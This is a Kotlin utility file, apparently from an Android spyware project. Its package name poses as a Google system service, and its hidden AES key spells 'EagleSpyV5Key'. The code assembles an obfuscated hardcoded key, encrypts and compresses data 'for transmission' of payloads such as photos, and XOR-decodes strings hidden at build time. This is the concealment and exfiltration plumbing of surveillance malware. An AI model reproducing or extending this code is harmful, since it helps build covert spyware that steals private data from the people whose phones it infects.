package com.google.android.systemservice.utils

import android.util.Base64
import java.io.ByteArrayOutputStream
import java.security.SecureRandom
import java.util.zip.GZIPOutputStream
import java.util.zip.GZIPInputStream
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

object CryptoHelper {

    private const val AES_ALGORITHM = "AES/GCM/NoPadding"
    private const val GCM_TAG_LENGTH = 128
    private const val IV_LENGTH = 12

    // Obfuscated key parts - assembled at runtime
    private val KEY_PARTS = arrayOf(
        byteArrayOf(0x45, 0x61, 0x67, 0x6C),  // "Eagl"
        byteArrayOf(0x65, 0x53, 0x70, 0x79),  // "eSpy"
        byteArrayOf(0x56, 0x35, 0x4B, 0x65),  // "V5Ke"
        byteArrayOf(0x79, 0x21, 0x40, 0x23),  // "y!@#"
        byteArrayOf(0x53, 0x65, 0x63, 0x75),  // "Secu"
        byteArrayOf(0x72, 0x65, 0x4B, 0x65),  // "reKe"
        byteArrayOf(0x79, 0x32, 0x30, 0x32),  // "y202"
        byteArrayOf(0x36, 0x45, 0x4E, 0x44)   // "6END"
    )

    private fun assembleKey(): ByteArray {
        val key = ByteArray(32)
        var offset = 0
        for (part in KEY_PARTS) {
            part.copyInto(key, offset)
            offset += part.size
        }
        return key
    }

    /**
     * Encrypt data with AES-256-GCM
     * Returns Base64 encoded: IV(12) + ciphertext + tag
     */
    fun encrypt(plaintext: ByteArray): String {
        val key = SecretKeySpec(assembleKey(), "AES")
        val iv = ByteArray(IV_LENGTH)
        SecureRandom().nextBytes(iv)

        val cipher = Cipher.getInstance(AES_ALGORITHM)
        cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))

        val encrypted = cipher.doFinal(plaintext)
        val result = ByteArray(iv.size + encrypted.size)
        iv.copyInto(result)
        encrypted.copyInto(result, iv.size)

        return Base64.encodeToString(result, Base64.NO_WRAP)
    }

    /**
     * Decrypt AES-256-GCM encrypted data
     */
    fun decrypt(encoded: String): ByteArray {
        val decoded = Base64.decode(encoded, Base64.NO_WRAP)
        val key = SecretKeySpec(assembleKey(), "AES")
        
        val iv = decoded.copyOfRange(0, IV_LENGTH)
        val ciphertext = decoded.copyOfRange(IV_LENGTH, decoded.size)

        val cipher = Cipher.getInstance(AES_ALGORITHM)
        cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))

        return cipher.doFinal(ciphertext)
    }

    /**
     * Encrypt a string
     */
    fun encryptString(text: String): String = encrypt(text.toByteArray(Charsets.UTF_8))

    /**
     * Decrypt to string
     */
    fun decryptString(encoded: String): String = String(decrypt(encoded), Charsets.UTF_8)

    /**
     * Compress data with GZIP
     */
    fun compress(data: ByteArray): ByteArray {
        val bos = ByteArrayOutputStream()
        GZIPOutputStream(bos).use { it.write(data) }
        return bos.toByteArray()
    }

    /**
     * Decompress GZIP data
     */
    fun decompress(compressed: ByteArray): ByteArray {
        return GZIPInputStream(compressed.inputStream()).use { it.readBytes() }
    }

    /**
     * Encrypt + compress for transmission (best for large payloads like photos)
     */
    fun encryptAndCompress(data: ByteArray): String {
        val compressed = compress(data)
        return encrypt(compressed)
    }

    /**
     * Obfuscated string storage - encode strings at build time, decode at runtime
     * Simple XOR with rotating key
     */
    fun deobfuscate(encoded: ByteArray, key: Byte = 0x5A): String {
        return String(encoded.mapIndexed { i, b -> (b.toInt() xor (key.toInt() + i) and 0xFF).toByte() }.toByteArray())
    }
}
